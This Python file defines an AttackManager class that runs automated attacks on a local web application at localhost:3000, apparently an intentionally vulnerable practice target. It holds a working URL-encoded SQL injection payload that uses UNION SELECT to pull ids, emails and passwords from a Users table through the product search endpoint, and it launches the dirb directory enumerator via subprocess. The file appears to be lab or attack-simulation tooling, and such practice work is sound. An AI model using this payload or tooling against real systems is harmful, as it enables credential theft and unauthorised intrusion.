from Automated_Users.Attacks.sql_get_user_credentials import SQLInjection
import threading
import dirbpy
import os
import subprocess

class AttackManager:
    
    def __init__(self):
        self.sql_injection = SQLInjection(base_url="http://localhost:3000")
    
    def run_sql_injection(self, info):
        if info == 'try hard':
            attack_thread = threading.Thread(target=self.sql_injection.run_tryhard, args=([]))
        else:  
            self.sql_injection = SQLInjection(base_url="http://localhost:3000",sql_query="/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
            attack_thread = threading.Thread(target=self.sql_injection.run, args=([]))
        attack_thread.start()

    def run_enum(self):
        with self.start_enum_process() as dirb:
            for line in dirb.stdout:
                print(line)
    
    def start_enum_process(self):
        enum_process = None
        enum_process = subprocess.Popen(['dirb', 'http://localhost:3000/'], stdout=subprocess.PIPE) 
        return enum_process
        #    enum_process.terminate()
        #    enum_process.kill()
        #enum = os.system('dirb http://localhost:3000/')

